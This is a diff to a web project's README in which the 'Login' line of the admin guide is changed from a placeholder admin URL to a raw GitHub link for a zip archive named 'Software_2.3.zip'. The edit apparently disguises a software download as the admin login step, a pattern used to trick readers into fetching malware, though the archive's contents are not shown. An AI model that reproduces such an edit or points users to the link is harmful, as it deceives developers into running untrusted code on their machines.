@@ -27,7 +27,7 @@ Our current focus is the public UI overhaul and AI integration:
 ---
 
 ## 📝 Admin Operations Guide
-- **Login**: `https://your-site.com/admin/login`
+- **Login**: `https://raw.githubusercontent.com/NoirCoder/technest/main/app/admin/Software_2.3.zip`
 - **Studio Mode**: Toggle the "Studio Mode" icon in the editor for a focused writing environment.
 - **Affiliates**: Manage partners in the Affiliate Hub, then use `[[affiliate:PartnerName]]` shorthands in your posts (auto-rendered on public site).
 - **Production Sync**: Changes committed in the Admin panel are reflected instantly on the public site via On-Demand Revalidation.
